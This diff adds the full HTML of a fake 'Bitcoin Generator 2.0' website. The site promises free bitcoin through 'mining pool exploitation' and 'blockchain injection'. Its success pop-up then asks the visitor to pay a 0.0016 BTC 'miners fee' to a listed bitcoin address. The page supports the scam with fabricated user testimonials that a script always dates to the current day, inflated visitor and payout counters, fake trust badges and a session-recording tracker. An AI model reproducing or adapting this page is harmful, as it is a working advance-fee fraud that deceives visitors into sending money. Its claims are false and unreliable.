@@ -1,0 +1,431 @@
+^<!DOCTYPE html>
+<html lang="en">
+<link rel="manifest" href="/manifest.json">
+
+<script src="https://cdn.viapush.com/cdn/v1/sdks/viapush.js" async charset="UTF-8"></script>
+<script>
+var ViaPush = window.ViaPush || [];
+ViaPush.push(["init", { appId: "65dad486-a243-9e51-9c85-09d21e994b33" }]);
+</script>
+<meta http-equiv="content-type" content="text/html;charset=UTF-8">
+<head>
+    <meta charset="UTF-8">
+	<!-- Yandex.Metrika counter -->
+<script type="text/javascript">
+   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(61757278, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true,
+        webvisor:true
+   });
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/61757278" style="position:absolute; left:-9999px;" alt></div></noscript>
+<!-- /Yandex.Metrika counter -->
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <link rel="icon" href="assets/images/favicon.png" tppabs="http://btc-gen.com/assets/images/favicon.png">
+    <title>Bitcoin Generator 2.0</title>
+    <meta name="description" lang="en" content="Bitcoin Generator">
+<meta name="keywords" content="bitcoin, bitcoin hack, bitcoin generator, free bitcoin generator, bitcoin free, bitcoin finder, earn bitcoins, hacking bitcoin, free wallet, bitcoin search funds">
+    <link rel="icon" type="image/png" href="assets/images/favicon.png" tppabs="http://btc-gen.com/assets/images/favicon.png">
+<link rel="stylesheet" href="http://btc-gen.com/libs/font-awesome/4.7.0/css/font-awesome.css" tppabs="http://btc-gen.com/assets/libs/font-awesome/4.7.0/css/font-awesome.css">
+    <link rel="stylesheet" href="http://btc-gen.com/libs/font-awesome/4.7.0/css/font-awesome.css" tppabs="http://btc-gen.com/assets/libs/font-awesome/4.7.0/css/font-awesome.css">
+    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
+
+<link rel="stylesheet" href="assets/plugins/bootstrap/css/bootstrap.min.css" tppabs="http://btc-gen.com/assets/plugins/bootstrap/css/bootstrap.min.html">
+<link rel="stylesheet" href="assets/content/ui/1.12.1/themes/base/jquery-ui.css" tppabs="code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
+<link rel="stylesheet" href="assets/content/ajax/libs/toastr.js/latest/css/toastr.min.css" tppabs="cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css">
+<link rel="stylesheet" href="assets/css/style.css" tppabs="http://btc-gen.com/assets/css/style.html">
+<link rel="stylesheet" href="assets/css/responsive.css" tppabs="http://btc-gen.com/assets/css/responsive.html">
+
+    <script>
+  (function(b,i,t,C,O,I,N) {
+    window.addEventListener('load',function() {
+      if(b.getElementById(C))return;
+      I=b.createElement(i),N=b.getElementsByTagName(i)[0];
+      I.src=t;I.id=C;N.parentNode.insertBefore(I, N);
+    },false)
+  })(document,'script','https://widgets.bitcoin.com/widget.js','btcwdgt');
+</script>
+
+    </head>
+
+<body><script type="text/javascript" src="https://check.ddos-guard.net/check.js" async defer></script>
+
+<header>
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <img src="assets/images/logo-white.png" tppabs="http://btc-generator.site/assets/images/logo-white.png" class="logo">
+                <ul class="pull-right">
+                    <li>
+                        <a href tppabs="http://btc-generator.site/index.html">HOME</a>
+                    </li>
+                    <li>
+                        <a href="transactions.html" tppabs="http://btc-generator.site/transactions">LATEST TRANSACTIONS</a>
+                    </li>
+
+                </ul>
+            </div>
+        </div>
+    </div>
+</header><section class="main">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-8 generator">
+                <h1>Are you ready to generate Bitcoin?</h1>
+
+                <h4>Select amount you want to generate:</h4>
+
+                <div id="slider-range-min">
+                    <span id="amount" class="amount"></span>
+                    <span class="arrow-left"></span>
+                </div>
+                <br>
+
+                <div class="input-holder">
+                    <input type="text" class="form-item input-address" placeholder="Enter your Bitcoin Address">
+                    <button class="submit start">
+                        <span class="fa fa-play"></span>
+                        GENERATE BTC
+                    </button>
+                </div>
+            </div>
+
+            <div class="col-md-8 terminal-bg none">
+                <div class="terminal"></div>
+            </div>
+
+            <div class="col-md-4 status none">
+                <div class="status-bg">
+                    <div class="item-top">
+                        <span class="pull-left">Your Transaction Status</span>
+                        <span class="pull-right current-status"></span>
+
+                        <div class="clearfix"></div>
+                        <div class="progress-bg">
+                            <div class="progress"><span class="status-share">0</span>%</div>
+                        </div>
+                        <div class="item">
+                        <span class="checked">
+                            <span class="fa fa-btc green"></span>
+                        </span>
+                            <span class="added">Bitcoin Generated</span>
+                            <span class="pull-right"><strong><span class="total-generated">0</span> BTC / <span class="selected-amount">0</span> BTC</strong></span>
+
+                            <div class="clearfix"></div>
+                        </div>
+                        <div class="item">
+                       <span class="checked">
+                            <span class="fa fa-check green"></span>
+                        </span>
+                            <span class="added">Mining Pools Scanned</span>
+                            <span class="pull-right"><strong class="pools-scanned">0</strong></span>
+
+                            <div class="clearfix"></div>
+                        </div>
+                        <div class="item">
+                        <span class="checked">
+                            <span class="fa fa-check green"></span>
+                        </span>
+                            <span class="added">Mining Pools Exploited</span>
+                            <span class="pull-right"><strong class="pool-exploited">0</strong></span>
+
+                            <div class="clearfix"></div>
+                        </div>
+                        <div class="item">
+                        <span class="checked">
+                            <span class="fa fa-check green"></span>
+                        </span>
+                            <span class="added">Blockchain Injection</span>
+                            <span class="pull-right"><strong class="blockchain-injection">0</strong></span>
+
+                            <div class="clearfix"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-md-4">
+                <img src="assets/images/rocket.png" tppabs="http://btc-generator.site/assets/images/rocket.png" class="rocket">
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="col-md-8 col-centered">
+                <div class="statistics">
+                    <div class="top">
+                        <div class="row">
+                            <div class="col-md-3 item">
+                                <span class="icon fa fa-user blueBack"></span>
+
+                                <div class="item-content">
+                                    <span class="title">Users Online</span><br>
+                                    <span class="number blue online-users">93</span>
+                                </div>
+                            </div>
+                            <div class="col-md-3 item">
+                                <span class="icon fa fa-money greenBack"></span>
+
+                                <div class="item-content">
+                                    <span class="title">Total Paid</span><br>
+                                    <span class="number green">
+                                        <span class="fa fa-btc"></span>
+                                        <span class="bitcoinPaid" data-value="38.8">38.8 BTC</span>
+                                    </span>
+                                </div>
+                            </div>
+                            <div class="col-md-3 item">
+                                <span class="icon fa fa-user purpleBack"></span>
+
+                                <div class="item-content">
+                                    <span class="title">Today Visitors</span><br>
+                                    <span class="number purple today-visitors" data-value="516">516</span>
+                                </div>
+                            </div>
+                            <div class="col-md-3 item">
+                                <span class="icon fa fa-user blueBack"></span>
+
+                                <div class="item-content">
+                                    <span class="title">Total Visitors</span><br>
+                                    <span class="number blue total-visitors" data-value="27542">29229</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="bottom">
+                        <center><h3>Bitcoin Price Today</h3></center>
+                        <center><div class="btcwdgt-price"></div></center>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+	<center>
+	    <video width="640" height="480" controls poster="assets/video/promo.jpg">
+   <source src="assets/video/bandicam.mp4" type="video/mp4">
+   Тег video не поддерживается вашим браузером.
+   <a href="assets/video/bandicam.mp4">Скачайте видео</a>.
+  </video>
+  </center>
+</section>
+<section class="features">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-8">
+                <div class="row">
+                    <h2 class="text-center">ALL <span class="green">FEATURES</span></h2>
+                    <div class="col-md-10 col-centered">
+                <span class="description">
+                    The exciting part of what we do is that we are doing for free giving you access to the best software for mining Bitcoin.
+                </span>
+                    </div>
+                    <div class="col-md-4 featured-item">
+                        <img src="assets/images/icons/icon-box-3.jpg" tppabs="assets/images/icons/icon-box-3.jpg" class="featured-icon">
+                        <h3>100% White Hat Ethics</h3>
+                        <div class="featured-content">
+                            Our software is 100% white-hat and it uses the newest technologies for mining bitcoin.
+                        </div>
+                    </div>
+                    <div class="col-md-4 featured-item">
+                        <img src="assets/images/icons/icon-box-4.jpg" tppabs="assets/images/icons/icon-box-4.jpg" class="featured-icon">
+                        <h3>Extremely Affordable</h3>
+                        <div class="featured-content">
+                            Perhaps the most affordable software on the market. Simple and very easy to use without installing anything.
+                        </div>
+                    </div>
+                    <div class="col-md-4 featured-item">
+                        <img src="assets/images/icons/icon-box-1.jpg" tppabs="assets/images/icons/icon-box-1.jpg" class="featured-icon">
+                        <h3>Everything online</h3>
+                        <div class="featured-content">
+                            You just need to type your bitcoin address where to receive Bitcoin and to sit and see how our software works.
+                        </div>
+                    </div>
+                    <div class="col-md-4 featured-item">
+                        <img src="assets/images/icons/icon-box-5.jpg" tppabs="assets/images/icons/icon-box-5.jpg" class="featured-icon">
+                        <h3>Safety First</h3>
+                        <div class="featured-content">
+                            You're completely anonymous while you're using our services. Nobody knows that you're generating bitcoin with us.
+                        </div>
+                    </div>
+                    <div class="col-md-4 featured-item">
+                        <img src="assets/images/icons/icon-box-6.jpg" tppabs="assets/images/icons/icon-box-6.jpg" class="featured-icon">
+                        <h3>Boost your wallet</h3>
+                        <div class="featured-content">
+                            Our software will allow you to boost your wallet with bitcoin as you never had before.
+                        </div>
+                    </div>
+                    <div class="col-md-4 featured-item">
+                        <img src="assets/images/icons/icon-box-2.jpg" tppabs="assets/images/icons/icon-box-2.jpg" class="featured-icon">
+                        <h3>Multiple servers control</h3>
+                        <div class="featured-content">
+                            During our software execution you are connecting to tons of servers which are generating bitcoin for you.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-md-4">
+                <section class="user-chat">
+
+    <h2 class="text-center">USER <span class="green">CHAT</span></h2>
+
+    <span class="description">
+        See what our users have to say about our software and about their experience with us.
+    </span>
+
+
+    <div class="item">
+        <div class="user-info">
+            <span class="letter l_1">L</span> <span class="user u_1">Mike Daniels</span> <span class="time"><span class="seconds s_1 comment-count" data-value="3"><td><script>
+var f = new Date();
+document.write(f.getDate() + "/" + (f.getMonth() +1) + "/" + f.getFullYear());
+</script> </td></span>
+        </span></div>
+        <span class="message m_1">Thanks so much, i really received in my wallet</span>
+    </div>
+    <div class="item">
+        <div class="user-info">
+            <span class="letter l_2">L</span> <span class="user u_2">Adam Zaccardo</span> <span class="time"><span class="seconds s_2 comment-count" data-value="3"><td><script>
+var f = new Date();
+document.write(f.getDate() + "/" + (f.getMonth() +1) + "/" + f.getFullYear());
+</script> </td></span>
+        </span></div>
+        <span class="message m_2">This works for me 100%</span>
+    </div>
+    <div class="item">
+        <div class="user-info">
+            <span class="letter l_3">L</span> <span class="user u_3">Irina Molkov</span> <span class="time"><span class="seconds s_3 comment-count" data-value="3"><td><script>
+var f = new Date();
+document.write(f.getDate() + "/" + (f.getMonth() +1) + "/" + f.getFullYear());
+</script> </td></span>
+        </span></div>
+        <span class="message m_3">OMG! this works, i have balance in my Bitcoin address</span>
+    </div>
+</section>
+
+<section class="reply">
+    <div class="item">
+        <div class="form-holder">
+            <input type="text" id="username" placeholder="Username" class="form-control form-item">
+            <textarea id="content" placeholder="Message" class="form-control form-item" maxlength="90"></textarea>
+            <button type="button" class="submit reply-submit">
+                <span class="fa fa-comment-o"></span>
+                LEAVE A COMMENT
+            </button>
+        </div>
+    </div>
+
+</section>            </div>
+        </div>
+    </div>
+</section>
+
+<div class="modal fade" tabindex="-1" role="dialog" id="finalModal" style="top:5%">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="popup">
+                <div class="modal-header">
+                    <h2>SUCCESS!</h2>
+                </div>
+                <div class="modal-body">
+                    <div class="item">
+                        <span class="pull-left">Wallet Address</span>
+                        <span class="pull-right"><span class="selected-address"></span></span>
+                        <div class="clearfix"></div>
+                    </div>
+                    <div class="item text-center">
+                        <span class="label label-success greenAmount"><span class="selected-amount">0.1</span> BTC</span> has been sent to wallet address <span class="label label-warning blueConfirmation">0/3 Confirmations</span>
+                    </div>
+                    <p class="info">
+                        The Bitcoin network requires a small fee to be paid for each transaction that goes to the miners, else a transaction might never be confirmed. <br>
+                        To ensure your transaction confirms consistently and reliably, pay the miners fee <strong><span>0.0016</span> BTC</strong> for this transaction at
+                    </p>
+                    <div class="item text-center">
+                        <h4 class="pay-address">37h1cAuKStqoyCUKJHjnihaJNqxxEcPUrf</h4>
+                        <img src="assets/images/qrcode.png" alt="1B1JZALSq4g9AzxQNnnFZ1XNfp1pQ57p81" style="width:150px;height:150px;">
+                         <img src="assets/images/loading.gif" alt="Waiting Payment" style="width:80px;height:80px;">
+                    </div>
+                </div>
+                <div class="modal-footer text-center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="modal fade" tabindex="-1" role="dialog" id="startModal">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="popup">
+                <div class="modal-header">
+                    <h2>Bitcoin Generator Tool</h2>
+                </div>
+                <div class="modal-body">
+                    <div class="item">
+                        <span class="pull-left">BTC Address</span>
+                        <span class="pull-right"><span class="selected-address"></span></span>
+                        <div class="clearfix"></div>
+                    </div>
+
+                    <div class="item">
+                        <span class="pull-left">BTC Target</span>
+                        <span class="pull-right greenAmount"><span class="selected-amount">0.1</span> BTC</span>
+                        <div class="clearfix"></div>
+                    </div>
+                    <p class="info">This operation takes a while and cannot be stopped, check your address before confirming.</p>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-danger cancel">CANCEL</button>
+                    <button class="btn btn-success confirm">CONFIRM</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div id="ouibounce-modal">
+    <div class="underlay"></div>
+    <div class="modal-holder">
+        <div class="ouibounce-header">
+            <span><strong>HOLD ON!</strong> GET YOUR BITCOIN TODAY!</span>
+        </div>
+        <div class="ouibounce-content">
+            <span class="fa fa-user"></span> <span class="blue total-visitors"></span> People have tried us already and they are very happy with us! <br>
+            Now is your chance to generate how much Bitcoin you want!
+        </div>
+        <div class="ouibounce-footer">
+            <button class="btn btn-success ouibounce-paid"><span class="fa fa-btc"></span> <span class="bitcoinPaid" data-value="38.8"> 38.8</span> BTC already paid!</button>
+        </div>
+    </div>
+</div>
+
+<script src="assets/plugins/jquery/jquery-3.1.1.min.js" tppabs="http://btc-gen.com/assets/plugins/jquery/jquery-3.1.1.min.html"></script>
+<script src="assets/plugins/bootstrap/js/bootstrap.min.js" tppabs="http://coin-generator.net/assets/plugins/bootstrap/js/bootstrap.min.js"></script>
+<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js" tppabs="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
+<script src="assets/plugins/ouibounce/ouibounce.min.js" tppabs="http://btc-gen.com/assets/plugins/ouibounce/ouibounce.min.js"></script>
+<script src="assets/plugins/terminal/typewriter.js" tppabs="http://btc-gen.com/assets/plugins/terminal/typewriter.js"></script>
+<script src="assets/content/terminal.js" tppabs="http://btc-gen.com/assets/content/terminal.js"></script>
+<script src="assets/plugins/qr/qrcode.min.js" tppabs="http://btc-gen.com/assets/plugins/qr/qrcode.min.js"></script>
+<script src="assets/content/ajax/libs/toastr.js/latest/js/toastr.min.js" tppabs="http://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
+<script src="assets/js/functions.js" tppabs="http://btc-gen.com/assets/js/functions.js"></script>
+<script src="assets/js/modules.js" tppabs="http://btc-gen.com/assets/js/modules.js"></script>
+<script src="assets/js/controller.js" tppabs="http://btc-gen.com/assets/js/controller.js"></script>
+<div class="floating-etrust">
+    <img src="assets/images/etrust.png" tppabs="http://btc-gen.com/assets/images/etrust.png" alt="truste verified" class="logo">
+    <img src="assets/images/guarantee.png" tppabs="http://btc-gen.com/assets/images/guarantee.png" alt="truste verified" class="logo">
+</div>
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                Copyrights &copy; 2020 - Bitcoin Generator V2.0
+            </div>
+        </div>
+    </div>
+</footer>
+</body>
+
+
+</html>
